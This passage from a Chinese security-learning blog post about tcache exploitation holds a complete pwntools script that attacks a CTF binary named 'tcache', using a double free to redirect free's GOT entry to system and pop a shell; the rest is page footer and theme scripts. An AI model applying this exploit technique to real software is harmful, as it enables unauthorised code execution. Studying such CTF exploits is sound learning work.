class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>context.word_size = <span class="hljs-number">64</span><br>context.os = <span class="hljs-string">&quot;linux&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br>p=<span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./tcache&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;eonew.cn&#x27;, 60109)</span><br>elf=ELF(<span class="hljs-string">&#x27;./tcache&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pid&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    f.<span class="hljs-built_in">write</span>(str(proc.pidof(p)[<span class="hljs-number">0</span>]))<br>    f.<span class="hljs-built_in">close</span>()<br>except Exception <span class="hljs-keyword">as</span> e:<br>    print(e)<br><br>def <span class="hljs-built_in">add</span>(size):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;What size do you want?&#x27;</span>,str(size))<br><br>def edit(<span class="hljs-built_in">num</span>,size,buf):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]choice3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Which one do you want to modify?&#x27;</span>,str(<span class="hljs-built_in">num</span>))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]str&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;What size is the point?&#x27;</span>,str(size))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]256&#x27;</span>)<br>    p.<span class="hljs-built_in">send</span>(buf)<br><br>def show(<span class="hljs-built_in">num</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Which one do you want to see?&#x27;</span>,str(<span class="hljs-built_in">num</span>))<br><br>def dele(<span class="hljs-built_in">num</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Which one do you want to delete?&#x27;</span>,str(<span class="hljs-built_in">num</span>))<br><br><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">24</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>,p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">24</span>)<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">24</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">result</span>=u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:<span class="hljs-number">-1</span>].ljust(<span class="hljs-number">8</span>,chr(<span class="hljs-number">0</span>)))<br>libc_base=<span class="hljs-built_in">result</span>-libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]libc_free:&#x27;</span>+hex(<span class="hljs-built_in">result</span>))<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]libc_base:&#x27;</span>+hex(libc_base))<br>sys_addr=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]system:&#x27;</span>+hex(sys_addr))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">24</span>,p64(sys_addr))<br>sleep(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">1</span>)<br>p.interactive()<br>os.<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;rm -f pid&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>tcache.md</div>
+      <div>https://nightrainy.github.io/2019/07/11/tcache机制利用学习/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>知世</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年7月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/07/17/ret2-dl-runtime-resolve/" title="ret2_dl_runtime_resolve">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ret2_dl_runtime_resolve</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/05/06/glic%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="glic内存管理学习笔记">
+                        <span class="hidden-mobile">glic内存管理学习笔记</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
